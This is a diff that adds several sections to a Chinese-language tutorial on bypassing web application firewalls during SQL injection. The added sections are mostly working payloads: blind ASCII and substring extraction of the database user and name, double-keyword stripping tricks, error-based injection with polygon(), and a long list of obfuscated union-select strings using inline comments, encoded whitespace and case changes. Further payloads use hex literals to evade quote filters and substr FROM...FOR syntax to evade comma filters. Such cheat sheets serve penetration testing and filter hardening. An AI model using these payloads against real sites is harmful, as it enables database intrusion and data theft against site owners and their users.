@@ -261,3 +261,107 @@ id=0 or 1=0 等于 id=0 || 1=0
 而且在 1=1 的基础上，可添加运算符，例如  
 id=1 and 1=1-1   
 id=1 && 1=1-1  
+
+4.5使用ascii 字符对比绕过  
+许多 waf 会对 union select 进行拦截 而且通常比较变态，那么可以不使用联合查询注入，可以使用字符截取对比法，进行突破。  
+select substring(user(),1,1);  
+select * from users where id=1 and substring(user(),1,1)='r';  
+select * from users where id=1 and ascii(substring(user(),1,1))=114;  
+最好把'r'换成成 ascii 码 如果开启 gpc int 注入就不能用了。  
+可以看到构造得 SQL 攻击语句没有使用联合查询(union select)也可以把数据查询出来。  
+
+4.6 对于删除关键词的绕过  
+有些程序会对单词 union、 select 进行转空 但是只会转一次这样会留下安全隐患。  
+双关键字绕过（若删除掉第一个匹配的 union 就能绕过）  
+id=-1'UNIunionONSeLselectECT1,2,3--+  
+到数据库里执行会变成 id=-1'UNION SeLECT1,2,3--+ 从而绕过注入拦截。  
+
+4.7 使用生僻函数绕过  
+使用生僻函数替代常见的函数，例如在报错注入中使用 polygon()函数替换常用的 updatexml()函数  
+
+ select polygon((select * from (select * from (select @@version) f) x));  
+不同的数据库据，以及同一种数据库的版本不同，那么所支持的函数也不同  
+
+4.8 绕过 order by 过滤  
+当 order by 被过滤时，无法猜解字段数，此时可以使用 into 变量名进行代替。  
+select * from users where id=1 into @a,@b,@c,@d;  
+
+4.9 绕过union select 过滤  
+目前不少 waf 都会使用都会对 union select 进行拦截 单个不拦截 一起就进行拦截。  
+针对单个关键词绕过  
+
+sel<>ect 程序过滤<>为空 脚本处理sele/**/ct 程序过滤/**/为空  
+ 
+/*!%53eLEct*/ url 编码与内联注释  
+ 
+se%0blect 使用空格绕过
+ 
+sele%ct 使用百分号绕过
+ 
+%53eLEct 编码绕过
+ 
+大小写
+ 
+uNIoN sELecT 1,2
+ 
+union all select 1,2
+ 
+union DISTINCT select 1,2
+ 
+null+UNION+SELECT+1,2
+ 
+/*!union*//*!select*/1,2
+ 
+union/**/select/**/1,2
+ 
+and(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()
+ 
+/*!50000union*//*!50000select*/1,2
+ 
+/*!40000union*//*!40000select*/1,2
+ 
+%0aunion%0aselect 1,2
+ 
+%250aunion%250aselect 1,2%09union%09select 1,2
+ 
+%0caunion%0cselect 1,2
+ 
+%0daunion%0dselect 1,2
+ 
+%0baunion%0bselect 1,2
+ 
+%0d%0aunion%0d%0aselect 1,2
+ 
+--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2
+ 
+/*!12345union*//*!12345select*/1,2;
+ 
+/*中文*/union/*中文*/select/*中文*/1,2;
+ 
+/**/union/**/select/*/1,2;
+ 
+/*!union*//*!00000all*//*!00000select*/1,2
+
+4.10 绕过单引号过滤  
+当单引号被过滤时，可尝试使用双引号代替单引号  
+select * from users where id='1';  
+select * from users where id="1";  
+也可以将字符串转换成16进制  
+select hex('admin');  
+select * from users where username='admin';  
+select * from users where username=0x61646D696E;  
+
+4.11 绕过逗号拦截  
+有些防注入脚本都会逗号进行拦截，例如常规注入中必须包含逗号的语句：  
+select * from users where id=1 union select 1,2,3,4;  
+一般会对逗号过滤成空 select * from users where id=1 union select 1 2 3 4;这样SQL 语句就会出错。所以 可以不使用逗号进行 SQL 注入。  
+
+绕过方法如下  
+substr 截取字符串  
+查询当前库第一个字符  
+select(substr(database() from 1 for 1));   
+注入语句示例：  
+select * from users where id=1 and 's'=(select(substr(database() from 1 for 1)));  
+可以进一步优化 s 换成 hex 0x73 这样就避免了单引号  
+select * from users where id=1 and 0x73=(select(substr(database() from 1 for 1)));  
+
